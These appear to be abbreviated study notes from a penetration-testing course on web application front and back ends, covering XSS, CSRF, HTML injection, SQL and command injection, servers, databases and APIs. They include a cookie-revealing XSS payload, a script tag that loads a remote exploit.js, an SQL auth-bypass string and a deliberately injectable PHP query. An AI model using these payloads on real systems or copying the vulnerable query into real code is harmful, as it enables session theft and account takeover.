All of the `front end` components that have be covered are interacted w on the client-side. Therefore, if they are atk'd, they do not pose a direct threat to the core `back end` of the web app and usually will not lead to perm dmg. However, as these components are exec'd on the `client-side`, they put the end-user in danger of being atk'd and exploited if they do have any vulns. If a front end vuln is leveraged to atk admin users, it could result in unauth access, access to sensitive data, service disruption, and more.

Although the majority of web app pentesting is focused on back end components and their fn, it is important also to test front end components for potential vulns, as these types of vulns can sometimes be util'd to gain access to sensitive fn'ality (e.g. an admin panel), which may lead to compromising the entire server.

[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) refers to the avail of sensitive data in clear-text to the end-user. This is usually found in the `source code` of the web pg or pg source on the front end of web apps. This is the HTML source code of the app, not to be confused w the back end code that is typically only accessible on the server itself. Any website's pg source can be viewed in a web browser by right-clicking anywhere on the pg and selecting `View Page Source` from the pop-up menu. Sometimes a dev may disable right-clicking on a web app, but this does not prevent being able to view the pg source as a keyboard shortcut can be set to do so or the pg source can be viewed through a web proxy such as `Burp Suite`. Taking a look at the google.com pg source will open a new tab in the browser w the URL `view-source:https://www.google.com/`. Here can be seen the `HTML`, `JS`, and external links.

Browsing through the pg source may reveal `login credentials`, `hashes`, or other sensitive data hidden in the comments of the source code or w/i external `JS` code being imported. Other sensitive info may include exposed links, dirs, or even exposed user info, all of which can potentially be leveraged to further access w/i the web app or even the web app's supporting infra (webserver, db server, etc.).
#### Example
At first glance, this login form does not look like anything out of the ordinary:![[Pasted image 20240617181503.png]]But, looking at the source code reveals that the devs added come comments that they forgot to rm:
```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```
`<!-- TODO: remove test credentials test:test -->` is the comment to notice, which seems to be a reminder for the devs to rm the test creds. Given that the comment has not been rm'd yet, these creds may still be valid.

Although it is not v common to find login creds in the dev comments, various bits of sensitive and valuable info can still be found, such as test pg's or dirs, debugging params, or hidden fn'ality. There are various automated tools that can be used to scan and analyze avail pg source code to id potential paths or dirs and other sensitive info.

Leveraging these types of info can give further access to the web app, which may help atking the back end components to gain ctrl o/ the server.
### Prevention
Ideally, the front end source code should only contain the code necessary to run all of the web app fn's, w/o any extra code or comments that are not necessary for the web app to fn properly. It is always important to review code that will be visible to end-users through the pg source or run it through tools to check for exposed info.

It is also important to classify data types w/i the source code and apply ctrls on what can or cannot be exposed on the client-side. Devs should also review client-side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end devs may want to use `JS` code packing or obfuscation to reduce the chances of exposing sensitive data through `JS code`. These techniques may prevent automated tools from locating these types of data.
## HTML Injection
Another major aspect of front end sec is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely proc'd and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front and back end.

[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the pg. This can either be through retrieving previously submitted code ,like retrieving a user comment from the back end db, or by directly displaying unfiltered user input through `JS` on the front end.

When a user has complete ctrl of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the pg. This may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login creds to a malicious server to be collected for other atks.

Another example of `HTML Injection` is web pg defacing. This consists of inj new `HTML` code to change the web pg's appearance, inserting malicious ads, or even completely changing the pg. This type of atk can result in severe reputational dmg to the co hosting the web app.
#### Example
The following example is a v basic web pg w a single button "`Click to enter your name`." When that button is clicked, it prompts the user to input their name and then displays, "`Your name is <name>`":![[Pasted image 20240618112451.png]]If no input sanitization is in place, this is potentially an easy target for `HTML Injection` and `XSS` atks. Taking a look at the pg source code reveals no input sanitization in place whatsoever, as the pg takes user input and directly displays it:
```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```
To test for `HTML inj`, simply input a small snippet of `HTML` code as the name and see if it is displayed as part of the pg. This example will test the following code, which changes the bg img of the web pg:
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```
Once inputed, the bg img instantly changes to:![[Pasted image 20240618112741.png]]In this example, as everything is being carried out on the front end, refreshing the web pg would reset everything back to normal.
## Cross-Site Scripting (XSS)
`HTML Injection` vulns can often be util'd to also perform [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) atks by inj `JS` code to be exec'd on the client-side. Once code can be exec'd on the victim's machine, access can potentially gained to the victim's acct or even their machine. `XSS` is v similar to `HTML inj` in practice. However, `XSS` involves the inj of `JS` code to perform more advanced atks on the client-side, instead of merely inj HTML code. There are three main types of `XSS`:

| **Type**        | **Description**                                                                                                              |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the pg after proc'ing (e.g. search result or err msg)                                 |
| `Stored XSS`    | Occurs when user input is stored in the back end db and then displayed upon retrieval (e.g. posts or cmts)                   |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML DOM` obj (e.g. vuln username or pg title) |
In the `HTML Inj` example in the previous section, there was no input sanitization whatsoever. Therefore, it may be possible for the same pg to be vuln to `XSS` atks, which can be attempted using the following `DOM XSS JS` code as a payload, showing the cookie val for the current user:
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```
Once the payload is inputted, hit `ok`, and, if successful, an alert window should pop up w the cookie val in it:![[Pasted image 20240618113836.png]]This payload is accessing the `HTML` doc tree and retrieving the `cookie` obj's val. When the browser proc's the input, it will be considered a new `DOM`, and the `JS` will be exec'd, displaying the cookie val in the popup.

An atkr can leverage this to steal cookie sesshions and send them to themselves and attempt to use the cookie val to auth to the victim's acct. The same atk can be used to perform various types of other atks against a web app's users. `XSS` is a vast topic that will be covered in-depth in later modules.
## Cross-Site Request Forgery (CSRF)
The third type of front end vuln that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf). `CSRF` atks may util `XSS` vulns to perform certain queries, and `API` calls on a web app that the victim is currently auth'd to. This would allow the atkr to perform actions as the auth'd user. It may also util other vulns to perform the same fns, like util HTTP params for atks.

A common `CSRF` atk to gain higher priv access to a web app is to craft a `JS` payload that auto-changes the victim's passwd to the val set by the atkr. Once the victim views the payload on the vuln pg (e.g. a malicious cmt containing the `JS CSRF` payload), the `JS` code would auto-exec. It would use the vic's logged-in session to change their passwd. Once that is done, the atkr can log in to the vic's acct and ctrl it.

`CSRF` can also be leveraged to atk admins and gain access to their accts. Admins usually have access to sensitive fns, which can sometimes be used to atk and gain ctrl o/ the back-end server (depending on the fn'ality provided to admins w/i a given web app). Following the examples used so far, instead of using `JS` code that would return the session cookie, load a remote `.js` file as follows:
```html
"><script src=//www.example.com/exploit.js></script>
```
The `exploit.js` file would contain the malicious `JS` code that changes the user's passwd. Dev;ing the `exploit.js` in the cs req's knowledge of this web app's passwd changing procedure and `APIs`. The atkr would need to create `JS` code that would replicate the desired fnality and auto-carry it out (i.e. `JS` code that changes the passwd for this specific web app).
### Prevention
Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end b4 it reaches the back end, and esp if this code may be displayed directly on the client-side w/o comms w the back end. Two main ctrls must be applied when accepting user input:

| **Type**       | **Description**                                                                                             |
| -------------- | ----------------------------------------------------------------------------------------------------------- |
| `Sanitization` | Removing special chars and non-std chars from user input b4 displaying it or storing it.                    |
| `Validation`   | Ensuring that submitted user input matches the expected format (i.e. submitted email matched email format). |
Furthermore, it is also important to sanitize displayed output and clear any special/nonstd chars. In cs an atkr mngs to bypass front and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once user input and displayed output is sanitized and/or validated, atks like `HTML inj`, `XSS`, and `CSRF` should be easy to prevent. Another solution would be to implement a [web app fw (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), which should help to prevent inj attempt automatically. However, it should be noted the `WAF` sol's can potentially be bypassed, so devs should following coding best practices and not merely rely on an appliance to detect/block atks.

As for `CSRF`, many modern browsers have built-in anti-CSRF measures, which auto-prevents exec'ing `JS` code. Furthermore, many modern web apps have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e. `anti-CSRF` token, or `http-only`/`X-XSS-Protection`). Certain other measures can be taken from a fnal level, like req the user to input their passwd b4 changing it. Many of these sec measures can be bypassed, and therefore these types of vulns can still pose a major threat to the users of a web app. This is why these precautions should only be relied upon as a secondary measure, and devs should always ensure that their code is not vuln to any of these atks.

This [Cross Site Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the atk and prevention measures in greater detail.
# Back End Components
## Back End Servers
A back-end server is the hardware and OS on the back end that hosts all of the apps necessary to run the web app. It is the realy sys running all the proc's and carrying out all of the tasks that make up the entire web app. The back end server would fit in the [data access layer](https://en.wikipedia.org/wiki/Data_access_layer) of the OSI model.
### Software
The back end server contains the other 3 back end components:
- `Web Server`
- `Database`
- `Development Framework` 
![[Pasted image 20240618120728.png]]Other software components on the back end server may include [hypervisors](https://en.wikipedia.org/wiki/Hypervisor), containers, and WAFs.

There are many popular combos of "stacks" for back end servers, which contain a specific set of back end components. Some common examples include:

| **Combinations**                                                  | **Components**                                     |
| ----------------------------------------------------------------- | -------------------------------------------------- |
| [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle))      | `Linux`, `Apache`, `MySQL`, and `PHP`.             |
| [WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP) | `Windows`, `Apache`, `MySQL`, and `PHP`.           |
| [WINS](https://en.wikipedia.org/wiki/Solution_stack)              | `Windows`, `IIS`, `.NET`, and `SQL Server`         |
| [MAMP](https://en.wikipedia.org/wiki/MAMP)                        | `macOS`, `Apache`, `MySQL`, and `PHP`.             |
| [XAMPP](https://en.wikipedia.org/wiki/XAMPP)                      | Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`. |
We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack).
### Hardware
The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web app will be. As previously discussed in the `Architecture` section, many archt's, esp for huge web apps, are designed to distribute their load o/ many back end servers that collectively work together to perform the same tasks and deliver the web app to the end user. Web apps do not have to run directly on a single back end server but may util data centers and cloud hosting servers that provide virtual hosts for the web app.
## Web Servers
A [web server](https://en.wikipedia.org/wiki/Web_server) is an app that runs on the back end server, which handles all of the HTTP traf from the client-side browser, routes it to the requested pgs, and finally responds to the client-side browser. Web servers usually run on TCP [ports](https://en.wikipedia.org/wiki/Port_(computer_networking)) `80` or `443`, and are responsible for connecting end-users to various parts of the web app, in addition to handling their various responses.
### Workflow
At typical web server accepts HTTP requests from the client-side, and responds w diff HTTP responses and codes, like a code `200 OK` response for a successful request, a code `404 NOT FOUND` when requesting pg's that do not exist, code `403 FORBIDDEN` for requesting access to a restricted pgs, and so on.![[Pasted image 20240618184432.png]]The following are some of the most common [HTTP response codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status):

| **Code**                    | **Description**                                                                                                   |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `200 OK`                    | The request has succeeded                                                                                         |
| `301 Moved Permanently`     | The URL of the requested resource has been changed permanently                                                    |
| `302 Found`                 | The URL of the requested resource has been changed temporarily                                                    |
| `400 Bad Request`           | The server could not understand the request due to invalid syntax                                                 |
| `401 Unauthorized`          | Unauthenticated attempt to access pg                                                                              |
| `403 Forbidden`             | The client does not have access rights to the content                                                             |
| `404 Not Found`             | The server can not find the requested resource                                                                    |
| `405 Method Not Allowed`    | The request method is known by the server but has been disabled and cannot be used                                |
| `408 Request Timeout`       | This response is sent on an idle connection by some servers, even w/o any previous request by the client          |
| `500 Internal Server Error` | The server has encountered a situation it doesn't know how to handle                                              |
| `502 Bad Gateway`           | The server, while working as a gateway to get a response needed to handle the request, recv'd an invalid response |
| `504 Gateway Timeout`       | The server is acting as a gateway and cannot get a response in time                                               |
Web servers also accept various types of user input w/i HTTP requests, including text, [JSON](https://www.w3schools.com/js/js_json_intro.asp), and even bin data (e.g. for file uploads). Once a web server recv's a web request, it is then responsible for routing it to its dest, run any proc's needed for that request, and return the response to the user on the client-side. The pgs and files that the web server proc's and route traf to are the web app core files.

The following shows an example of requesting a pg in a Linux terminal using the [cURL](https://en.wikipedia.org/wiki/CURL) util, and recv'ing the server response while using the `-I` flag, which displays the following headers:
```shell
$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```
While this `cURL` cmd example shows the source code of the webpage:
```shell
$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device=width, initial-scale=1.0">
```
Many web server types can be util'd to run web apps. Most of these can handle all types of complex HTTP requests, and they are usually free of charge. It's also possible to develop a custom basic web server using langs such as `Python`, `JS`, and `PHP`. However, for each lang, there's a popular web app that is optimized for handling large amts of web traf, which saves time in creating a custom built web server.
### Apache
![[Pasted image 20240620170940.png]][Apache](https://www.apache.org/), or `httpd`, is the most common web server on the internet, hosting more than `40%` of all internet websites. `Apache` usually comes pre-installed in most `Linux` distros and can also be installed on Win and macOS servers.

`Apache` is usually used w `PHP` for web app dev, but it also supports other langs like `.Net`, `Python`, `Perl`, and even OS langs like `Bash` through `CGI`. Users can install a wide variety of `Apache` modules to extended its fn'ality and support more langs e.g. to support serving `PHP` files, users must install `PHP` on the back end server, in addition to installing the `mod_php` module for `Apache`.

`Apache` is a FOSS proj, and community users can access its source code to fix issues and look for vulns. It is well-maintained and regularly patched against vulns to keep it safe against exploitation. Furthermore, it is v well doc'd, making using and conf'ing dif parts of the webserver relatively easy. `Apache` is commonly used by startups and smaller co's, as it is straightforward to dev for. Still, some big co's, like `Apple`, `Adobe`, and `Baidu`, util `Apache`.
### NGINX
![[Pasted image 20240620190829.png]]
[NGINX](https://www.nginx.com/) is the second most common web server on the internet, hosting roughly `30%` of all internet websites. `NGINX` focuses on serving many concurrent web requests w relatively low mem and CPU load by util'ing an async archt to do so. This makes `NGINX` a v reliable web server for popular web apps and top businesses worldwide, which is why it is the most popular web server among high traf websites, w around 60% of the top 100,000 websites using `NGINX`.

`NGINX` is foss, which gives all the same benefits previously mentioned, like sec and reliability. Some popular websites the util `NGINX` includes: `Google`, `Facebook`, `Twitter`, `Cisco`, `Intel`, `Netflix`, and `HackTheBox`.
### IIS
![[Pasted image 20240620224541.png]][ISS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet_Information_Services) is the third most common web server on the internet, hosting around `15%` of all internet web sites. `IIS` is dev'd an maintained by Microsoft and mainly runs on Microsoft Windows Servers. `IIS` is usually used to host web apps dev'd for the Microsoft .NET framework, but can also be used to host web apps dev'd in other langs like `PHP`, or host other types of services like `FTP`. Furthermore, `IIS` is v well optimized for AD integration and includes feats like `Windows Auth` for auth'ing users using AD, allowing them to auto-sign in to web apps.

Though not the most popular web server, many big orgs use `IIS` as their web server. Many of them use Windows Server on their back end or rely heavily on AD w/i their org. Some popular websites util IIS include: `Microsoft`, `Office365`, `Skype`, `Stack Overflow`, and `Dell`.
### Others
Aside from these 3 webservers, there are many other commonly used web servers, like [Apache Tomcat](https://tomcat.apache.org/) for `Java` web apps, and [Node.JS](https://nodejs.org/en/) for web apps dev'd using `JS` on the back end.
## Databases
Web apps util back end [databases (db)](https://en.wikipedia.org/wiki/Database) to store various content and info related to the web app. This can be core web app assets like imgs and files, web app content like posts and updates, or user data like usernames and passwds. This allows web apps to easily and quickly store and retrieve data and enable dynamic content that is dif for each user.

There are many dif types of dbs, each of which fits a certain type of use. Most devs look for certain char'istics in a db, such as `speed` in storing and retrieving data, `size` when storing large amts of data, `scalability` as the web app grows, and `cost`.
### Relational (SQL)
[Relational (SQL) databases](https://en.wikipedia.org/wiki/Relational_database) store their data in tables, rows, and columns. Each table can have unique keys, which can link tbls together and create relationships b/w tbls.

For example, suppose there is a `users` table in a RDB containing columns like `id`, `username`, `first_name`, `last_name`, and so on. The `id` can be used as the tbl key, Another tbl, `posts`, may contain posts made by all users, w columns like `id`, `user_id`, `date`, `content`, and so on.![[Pasted image 20240620232206.png]]The `id` column from the `users` table can be linked to the `user_id` in the `posts` table to easily retrieve the user details for each post, w/o having to store all user details w each post.

A tbl can have more than one key, as another column can be used as a key to link w another tbl e.g. the `id` column can be used as a key to link the `posts` tbl to another tbl containing cmts, each of which belongs to a certain post, and so on.

`The relationship b/w tbls w/i a db is called a Schema.`

This way, by using relational dbs, it becomes v quick and easy to retrieve all data about a certain element from all dbs e.g. a single query can be used to retrieve all details linked to a certain user from all tbls. This makes relational dbs v fast and reliable for big datasets that have a clear structure and design. Dbs also make data mngment v efficient.

Some of the most common relational dbs include:

| **Type**                                                    | **Description**                                                                                                                                                                               |
| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [MySQL](https://en.wikipedia.org/wiki/MySQL)                | The most commonly used database around the internet. It is an open-source database and can be used completely free of charge                                                                  |
| [MSSQL](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) | Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers                                                                                     |
| [Oracle](https://en.wikipedia.org/wiki/Oracle_Database)     | A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses      |
| [PostgreSQL](https://en.wikipedia.org/wiki/PostgreSQL)      | Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design |
Other common SQL databases include: `SQLite`, `MariaDB`, `Amazon Aurora`, and `Azure SQL`.
### Non-relational (NoSQL)
A [non-relational database](https://en.wikipedia.org/wiki/NoSQL) does not use tbls, rows, columns, primary keys, relationships, or schemas. Instead, a `NoSQL` db stores data using various strg models, depending on the type of data stored.

Due to the lack of a def'd structure for the db, `NoSQL` dbs are v scalable and flexible. When dealing w datasets that are not v well defined and structured, a `NoSQL` db would be the best choise for storing data.

There are 4 common strg models for `NoSQL` dbs:
- Key-Value
- Document-Based
- Wide-Column
- Graph
Each of the above models has a dif way of storing data e.g. the `Key-Value` model usually stores data in `JSON` or `XML`, and has a key for each pair, storing all of its data as its val:![[Pasted image 20240620233311.png]]The above example can be represented using `JSON` as follows:
```json
{
	"100001": {
		"date": "01-01-2021",
		"content": "Welcome to this web application."
	},
	"100002": {
		"date": "02-01-2021",
		"content": "This is the first post on this web app."
	},
	"100003": {
		"date": "02-01-2021",
		"content": "Reminder: Tomorrow is the ..."
	}
}
```
It looks similar to a dict/map/key-val pair in langs like `Python` or `PHP` (i.e. `{'key':'value'}`), where the `key` is usually a str, and the `value` can be a str, dict, or any class obj.

The `Document-Based` model stores data in complex `JSON` objs and each obj has certain meta-data while storing the rest of the data similarly to the `Key-Value` model.

Some of the most common `NoSQL` dbs include:

| **Type**                                                           | **Description**                                                                                                                                                                                  |
| ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [MongoDB](https://en.wikipedia.org/wiki/MongoDB)                   | The most common `NoSQL` database. It is free and open-source, uses the `Document-Based` model, and stores data in `JSON` objects                                                                 |
| [ElasticSearch](https://en.wikipedia.org/wiki/Elasticsearch)       | Another free and open-source `NoSQL` database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient |
| [Apache Cassandra](https://en.wikipedia.org/wiki/Apache_Cassandra) | Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values                                                                                            |
Other common `NoSQL` databases include: `Redis`, `Neo4j`, `CouchDB`, and `Amazon DynamoDB`.
### Use in Web Apps
Most modern web dev langs and frameworks make it easy to integrate, store, and retrieve data from various db types. But first, the db has to be installed and set up on the backend server, and once it is up and running, the web apps can start util'g it to store and retrieve data.

For example, w/i a `PHP` web app, once `MySQL` is up and running, the following cmd can be used to connect to the db:
```php
$conn = new mysqli("localhost", "user", "pass");
```
Then, the following cmd creates a new db:
```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```
After that, use this cmd to connect to the new db, and start using the `MySQL` db through `MySQL` syntax, right w/i `PHP`:
```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```
Web apps usually use user-input when retrieving data e.g. when a user uses the search fn to search for other users, their search input is passed to the web app, which uses the input to search w/i the db(s).
```php
$searchInput = $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```
Finally, the web app sends the result back to the user:
```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```
This basic example shows how easy it is to util dbs. However, if not sec coded, db code can lead to a variety of issues, like [SQL Injection Vulns](https://owasp.org/www-community/attacks/SQL_Injection).
## Development Frameworks & APIs
In addition to web servers that can host web apps in various langs, there are many common web dev frameworks that help in dev'g core web app files and fn'y. W the inc'g complexity of web apps, it may be challenging to create a modern and sophisticated web app from scratch. Hence, most of the popular web apps are dev'd using web frameworks.

As most web apps share common fn'ality, such as user reg, web dev't frameworks make it easy to quickly implement this fn'ality and link them to the front end components, making a fully fn'al web app. Some of the most common web dev frameworks. Some of the most common web dev frameworks include:
- [Laravel](https://laravel.com/) (`PHP`): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
- [Express](https://expressjs.com/) (`Node.JS`): used by `PayPal`, `Yahoo`, `Uber`, `IBM`, and `MySpace`.
- [Django](https://www.djangoproject.com/) (`Python`): used by `Google`, `YouTube`, `Instagram`, `Mozilla`, and `Pinterest`.
- [Rails](https://rubyonrails.org/) (`Ruby`): used by `GitHub`, `Hulu`, `Twitch`, `Airbnb`, and even `Twitter` in the past.

> It should be noted that popular websites usually util'z a variety of frameworks and web servers, rather than just one.

### APIs
An important aspect of back end web app dev't is the use of Web [APIs](https://en.wikipedia.org/wiki/API) and HTTP Request param's to connect the front end and the back end to be able to send data back and forth b/w front end and back end components and carry out various fn's w/i the web app.

For the frontend component to interact w the backend and ask for certain tasks to be carried out, they util APIs to ask the backend component for a specific task w specific input. The backend components proc these requests, perform the nec fn's, and return a certain response to the frontend components, which finally renders the end-user's output on the client-side.
#### Query Parameters
The default method of sending specific args to a web pg is throug h`GET` and `POST` request params. This allows the frontend components to specify vals for certain params used w/i the pg for the back end components to proc them and respond accordingly.

For example, a `/search.php` pg would take an `item` param, which may be used to specify the search item. Passing a param through a `GET` request is done through the URL `/search.php?item=apples`, while `POST` params are passed through `POST` data at the bottom of the `POST HTTP` request:
```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```
Query params allow a single pg to recv various types of input, each of which can be proc'd dif'y. For certain other scenarios, Web APIs may be much quicker and more efficient to use. The [Web Requests module](https://academy.hackthebox.com/course/preview/web-requests) takes a deeper dive into `HTTP` requests.
### Web APIs
An [Application Programming Interface (API)](https://en.wikipedia.org/wiki/API) is an interface w/i an application that specifies how the app can interact w other apps. For Web Apps, it is what allows remote access to fn'ality on backend components. APIs are not exclusive to web apps and are used for software apps in general. Web APIs are usually accessed o/ the `HTTP` protocol and are usually handled and translated through web servers. ![[Pasted image 20240621151738.png]]A weather web application, for example, may have a certain API to retrieve the current weather for a certain city. The API can be requested then pass the name name or city ID, and it would return the current weather in a `JSON` obj. Another example is Twitter's API, which allows users to retrieve the latest Tweets from a certain acct in `XML` or `JSON` formats, and even allows users to send a Tweet 'if authenticated', and so on.

To enable the use of APIs w/i a web app, devs have to dev this fn'ality on the backend of the web app by using the API std's like `SOAP` or `REST`.
#### SOAP
The [Simple Objects Access (SOAP)](https://en.wikipedia.org/wiki/SOAP) std shares data through `XML`, where the request is made in `XML` through an HTTP request, and the response is also returned in `XML`. Frontend components are designed to parse this `XML` output properly. The following is an example `SOAP` msg:
```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap"
soap:encodingStyle="http://www/w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
	<soap:Fault>
	</soap:Faulth>
</soap:Body>
```
`SOAP` is very useful for transferring structured data (e.g. an entire class obj), or even bin data, and is often used w serialized objs, all of which enables sharing data b/w frontend and backend components and parsing it properly. It is also v useful for sharing _stateful_ objs (e.g. sharing/changing the current state of a web pg), which is becoming more common w modern web apps and mobile apps.

However, `SOAP` may be dif to use for beginners or req long and complicated requests even for smaller queries, like basic `search` or `filter` queries. This is where the `REST` API std is more useful.
#### REST
The [Representational State Transfer (REST)](https://en.wikipedia.org/wiki/Representational_state_transfer) std shares data through the URL path (i.e. `search/users/1`), and usually returns the output in `JSON` format (i.e. `userid 1`).

Unlike Query Params, `REST` APIs usually focus on pgs that expect one type of input passed directly through the URL path, w/o specifying its name or type. This is usually useful for queries like `search`, `sort`, or `filter`. This is why `REST` APIs usually break web app fn'ality into smaller APIs and util these smaller API requests to allow the web app to perform more advanced actions, making the web app more modular and scalable.

Response to `REST` API requests are usually made in `JSON` format, and the frontend components are then dev'd to handle this response and render it properly. Other output formats for `REST` include `XML`, `x-www-form-urlencoded`, or even raw data. As seen previously in the `database` section, the following is an example of a `JSON` response to the `GET /category/posts` API request:
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```
`REST` uses various HTTP methods to perform dif actions on the web app:
- `GET` request to retrieve data
- `POST` request to create data (non-idempotent)
- `PUT` request to create or replace existing data ([idempotent](https://en.wikipedia.org/wiki/Idempotence))
- `DELETE` request to rm data
# Backend Vulnerabilities
## Common Web Vulnerabilities
While performing a pentest on an internally dev'd web app or if no public exploits are found for a public web app, several vulns can still be manually ID'd. Vulns caused by misconf's can also be uncovered, even in publicly avail web apps, since these types of vulns are not caused by the public version of the web app but by a misconf made by the devs. The below examples are some of the most common vuln types for web apps, part of [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulns for web apps.
### Broken Authentication/Access Control
`Broken authentication` and `Broken Access Control` are among the most common and most dangerous vulns for web apps.

`Broken auth'n` refers to vulns that atkrs to bypass auth'n fn's. (e.g. allowing an atkr to login w/o having a vaild set of creds or allow a normal user to become an admin w/o having the privs to do so).

`Brokan Access Ctrl` refers to vulns that allow atkrs to access pgs and feats they should not have access to (e.g. a normal user gaining acess to the admin panel).

For example, `College Management System 1.2` has a somple [Auth Bypass](https://www.exploit-db.com/exploits/47388) vuln that allows an atkr to login w/o having an acct, by inputting the following for the email field: ` or 0=0 #`, and using any passwd w it.
### Malicious File Upload
Another common way to gain ctrl o/ web apps is through uploading malicious scripts. If the web app has a file upload feat and does not properly validate the uploaded files, an atkr may upload a malicious script (e.g. a `PHP` script), which will allow the atkr to exec cmds on the remote server.

Even though this is a basic vuln, many devs are not aware of these threats, so they do not properly check and validate uploaded files. Furthermore, some devs do perform checks and attempt to validate uploaded files, but these checks can often be bypassed, which would still allow the atkr to upload malicious scripts.

For example, the WordPress Plugic `Responsive Thumbnail Slider 1.0` can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file w a double ext (e.g. `shell.php.jpg`). There's even a [Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/) that allows atkrs to exploit this vuln easily.
### Command Injection
Many web apps exec local OS cmds to perform certain prog's. e.g. a web app may install a plugin of an atkrs choosing by exec'g an OS cmd that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, atkrs may be able to inject another cmd to be exec'd alongside the originally intended cmd (e.g. as the plugin name), which allows them to directly exec cmds on the backend server and gain ctrl o/ it. This type of vuln is called [command injection](https://owasp.org/www-community/attacks/Command_Injection).

This vuln is widespread, as devs may not properly sanitize user input or use weak tests to do so, allowing atkrs to bypass any checks or filtering put in place and exec their cmds.

E.g. the WordPress Plugin `Plainview Activity Monitor 20161228` has a [vulnerability](https://www.exploit-db.com/exploits/45274) that allows atkrs to inj their command in the `ip` val, by simple adding `| COMMAND...` after the `ip` val.
### SQL Injection (SQLi)
Another v common vuln in web apps is a `SQL Injection` vuln. Similarly to a cmd inj vuln, this vuln may occur when the web app exec's a SQL query, including a val taken from user-supplied input

E.g. the `databases` section demonstrated an example of how a web app would use user-input to search w/i a certain tbl, w the following line of code:
`$query = "select * from users where name like '%$searchInput%'";`
If the user input is not filtered and validated (as is the case w `cmd inj's`), an atkr may exec another SQL query alongside this query, which may eventually allow atkrs to take ctrl o/ the db and its hosting server.

E.g. the same previous `College Management System 1.2` suffers from a SQLi [vuln](https://www.exploit-db.com/exploits/47388), in which an atkr can exec another `SQL` query that always returns `true`, meaning the atkr successfully auth'd, which allows the atkr to log in to the app. Atkrs can use the same vuln to retrieve data from the db or even gain ctrl o/ the hosting server.

This career will see these vulns again and again while learning and real-world assessments. It is important to become familiar w each of these as even a basic understanding of each will give a leg up in any infosec realm. Later modules will cover each of these vulns in-depth.
## Public Vulnerabilities
